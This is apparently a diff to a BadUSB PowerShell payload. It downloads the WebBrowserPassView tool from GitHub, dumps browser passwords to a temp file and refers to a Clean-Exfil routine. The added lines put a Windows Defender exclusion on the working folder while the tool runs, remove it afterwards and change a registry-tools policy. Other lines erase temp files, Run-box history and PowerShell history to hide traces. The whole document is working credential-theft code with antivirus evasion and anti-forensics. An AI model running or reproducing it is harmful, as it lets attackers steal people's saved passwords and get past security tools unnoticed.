@@ -1,5 +1,7 @@
 Set-Location C:\Users\Public\Documents
 
+Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents' # Disabling antivirus activation
+
 Invoke-WebRequest https://github.com/arpanghosh8453/badusb/blob/main/binary/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
 
 .\WebBrowserPassView.exe /stext $env:TEMP/$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
@@ -7,6 +9,8 @@ Invoke-WebRequest https://github.com/arpanghosh8453/badusb/blob/main/binary/WebB
 Start-Sleep -Seconds 10
 
 RI WebBrowserPassView.exe
+
+Remove-MpPreference -ExclusionPath 'C:\Users\Public\Documents'
 
 ############################################################################################################################################################
 
@@ -89,8 +93,8 @@ if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # delete run box history
+Set-ItemProperty -Path Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableRegistryTools -Value 0
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
 
 # Delete powershell history
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-
